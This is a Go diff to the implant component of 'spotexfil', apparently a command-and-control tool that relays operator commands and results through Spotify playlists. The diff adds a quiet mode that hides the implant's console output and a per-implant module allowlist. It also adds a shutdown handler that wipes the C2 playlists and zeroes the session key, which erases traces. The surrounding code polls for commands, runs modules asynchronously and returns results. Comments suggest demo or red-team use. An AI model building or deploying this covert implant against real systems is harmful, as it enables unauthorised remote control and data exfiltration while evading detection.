@@ -13,9 +13,11 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"os/signal"
 	"runtime"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 
 	"github.com/sourcefrenchy/spotexfil/internal/crypto"
@@ -29,6 +31,8 @@ type Implant struct {
 	key             string
 	interval        int
 	jitter          int
+	quiet           bool            // suppress non-error output
+	allowedModules  map[string]bool // nil = all modules allowed
 	processedSeqs   map[int]bool
 	checkinPending  bool
 	readFails       int // consecutive READ failures (polling)
@@ -52,8 +56,23 @@ type Implant struct {
 	sessionKey []byte // derived ECDH session key (nil until key exchange)
 }
 
-// NewImplant creates a new implant.
+// ImplantOptions controls implant behavior.
+type ImplantOptions struct {
+	Interval       int
+	Jitter         int
+	Quiet          bool
+	AllowedModules []string // nil or empty = all modules enabled
+}
+
+// NewImplant creates a new implant with default options.
 func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
+	return NewImplantWithOptions(client, key,
+		ImplantOptions{Interval: interval, Jitter: jitter})
+}
+
+// NewImplantWithOptions creates a new implant with explicit options.
+func NewImplantWithOptions(client *spotify.Client, key string, opts ImplantOptions) *Implant {
+	interval, jitter := opts.Interval, opts.Jitter
 	// Enforce minimum 20s interval to avoid Spotify rate limits
 	if interval < 20 {
 		fmt.Printf("[!] Interval %ds too low, setting to 20s "+
@@ -89,11 +108,20 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 			hex.EncodeToString(ephPub.Bytes())[:24]+"...")
 	}
 	fmt.Println()
+	var allowedModules map[string]bool
+	if len(opts.AllowedModules) > 0 {
+		allowedModules = make(map[string]bool, len(opts.AllowedModules))
+		for _, name := range opts.AllowedModules {
+			allowedModules[name] = true
+		}
+	}
 	return &Implant{
 		client:          client,
 		key:             key,
 		interval:        interval,
 		jitter:          jitter,
+		quiet:           opts.Quiet,
+		allowedModules:  allowedModules,
 		processedSeqs:   make(map[int]bool),
 		sessionID:       sessionID,
 		clientID:        clientID,
@@ -131,6 +159,16 @@ func getClientID(encryptionKey string) string {
 	h := hmac.New(sha256.New, []byte(encryptionKey))
 	h.Write([]byte(hostname + "|" + username + "|" + mac))
 	return hex.EncodeToString(h.Sum(nil))[:16]
+}
+
+// logf prints a non-error diagnostic message unless quiet mode is on.
+// Error/diagnostic prints (those starting with "[!]") use fmt directly
+// and stay visible even in quiet mode.
+func (imp *Implant) logf(format string, args ...interface{}) {
+	if imp.quiet {
+		return
+	}
+	fmt.Printf(format, args...)
 }
 
 // getSessionKey returns a copy of the current ECDH session key,
@@ -215,7 +253,7 @@ func (imp *Implant) sendCheckin() {
 		imp.checkinPending = true
 		return
 	}
-	fmt.Printf("\033[32m[+] Check-in sent\033[0m (%s) at %s\n",
+	imp.logf("\033[32m[+] Check-in sent\033[0m (%s) at %s\n",
 		imp.clientID[:8], time.Now().Format("15:04:05"))
 	imp.checkinPending = false
 	imp.lastCheckin = time.Now()
@@ -312,7 +350,24 @@ func (imp *Implant) resultWriter() {
 
 // Run starts the main polling loop.
 func (imp *Implant) Run() {
-	fmt.Println("\033[32m[*] Implant active — polling for commands\033[0m")
+	imp.logf("\033[32m[*] Implant active — polling for commands\033[0m\n")
+
+	// Self-cleanup on exit signal: wipe the incoming command queue and
+	// zero the session key before exiting. Note: Go cannot reliably wipe
+	// string keys from memory (the GC copies them), so this is
+	// best-effort only.
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigCh
+		fmt.Println("\n[*] Shutdown signal, cleaning up...")
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer cancel()
+		_ = imp.client.CleanC2Playlists(ctx, protocol.ChannelCmd, imp.key, -1)
+		imp.setSessionKey(nil)
+		os.Exit(0)
+	}()
+
 	imp.sendCheckin()
 
 	// Start async result writer
@@ -338,7 +393,7 @@ func (imp *Implant) Run() {
 				writeBackoffUntil = time.Now().Add(
 					time.Duration(backoff) * time.Second)
 				if imp.writeFails <= 3 || imp.writeFails%10 == 0 {
-					fmt.Printf("[*] Write backoff: retry in %s (fail #%d)\n",
+					imp.logf("[*] Write backoff: retry in %s (fail #%d)\n",
 						formatDuration(backoff), imp.writeFails)
 				}
 			} else {
@@ -358,7 +413,7 @@ func (imp *Implant) Run() {
 			}
 			sleepTime = backoff
 			if imp.readFails <= 3 || imp.readFails%10 == 0 {
-				fmt.Printf("[*] Read backoff: next poll in %s (fail #%d)\n",
+				imp.logf("[*] Read backoff: next poll in %s (fail #%d)\n",
 					formatDuration(sleepTime), imp.readFails)
 			}
 		}
@@ -482,7 +537,7 @@ func (imp *Implant) pollAndExecute() {
 			continue
 		}
 
-		fmt.Printf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)
+		imp.logf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)
 
 		// Async execution: dispatch to goroutine, send result via channel
 		imp.wg.Add(1)
@@ -544,7 +599,7 @@ func (imp *Implant) handleKeyExchange(msg *protocol.C2Message) {
 	}
 
 	imp.setSessionKey(sessionKey)
-	fmt.Printf("\033[32m[+] Forward secrecy established\033[0m at %s\n",
+	imp.logf("\033[32m[+] Forward secrecy established\033[0m at %s\n",
 		time.Now().Format("15:04:05"))
 }
 
@@ -556,6 +611,18 @@ func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
 			Seq:       msg.Seq,
 			Status:    "error",
 			Data:      fmt.Sprintf("Unknown module: %s", msg.Module),
+			SessionID: imp.sessionID,
+		}
+	}
+
+	// Module allowlist: lets a demo operator disable noisy modules
+	// (e.g. screenshot triggers a macOS Screen Recording prompt).
+	if imp.allowedModules != nil && !imp.allowedModules[msg.Module] {
+		return &protocol.C2Message{
+			Module:    msg.Module,
+			Seq:       msg.Seq,
+			Status:    "error",
+			Data:      fmt.Sprintf("Module disabled on this implant: %s", msg.Module),
 			SessionID: imp.sessionID,
 		}
 	}
@@ -596,5 +663,5 @@ func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) 
 		return
 	}
 
-	fmt.Printf("\033[90m[<] Result sent seq=%d\033[0m\n", result.Seq)
+	imp.logf("\033[90m[<] Result sent seq=%d\033[0m\n", result.Seq)
 }
